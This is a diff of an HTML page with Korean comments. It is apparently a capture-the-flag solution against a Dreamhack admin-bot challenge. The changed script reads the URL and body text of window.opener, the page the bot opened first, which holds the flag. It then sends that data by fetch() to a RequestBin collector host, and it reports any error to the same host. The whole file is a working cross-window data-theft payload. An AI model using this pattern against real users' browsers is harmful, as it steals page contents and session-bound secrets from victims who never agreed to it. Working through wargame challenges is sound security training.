@@ -2,19 +2,25 @@
   <body>
     <script>
       try {
-        // 현재 URL 자체가 note 파라미터를 포함할 수도 있음
-        let flag = document.location.href;
+        // 1. AdminBot이 먼저 연 page1을 window.opener로 접근
+        let flagUrl = window.opener.location.href; // page1 URL에 note=FLAG 있음
 
-        // body 안에 출력될 수도 있으니 추가로 확인
-        flag += " | " + document.body.innerText;
+        // 2. 혹시 페이지 body에도 flag가 렌더링되어 있으면 가져오기
+        let flagText = window.opener.document.body.innerText;
 
-        // Dreamhack RequestBin 으로 전송
+        // 3. flag 조합
+        let flag = flagText || flagUrl;
+
+        // 4. DreamHack RequestBin으로 전송
         fetch("https://zapzhub.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
       } catch (e) {
+        // 오류 발생 시 에러 전송
         fetch("https://zapzhub.request.dreamhack.games/?error=" + encodeURIComponent(e));
       }
     </script>
   </body>
 </html>
+
+
 
 
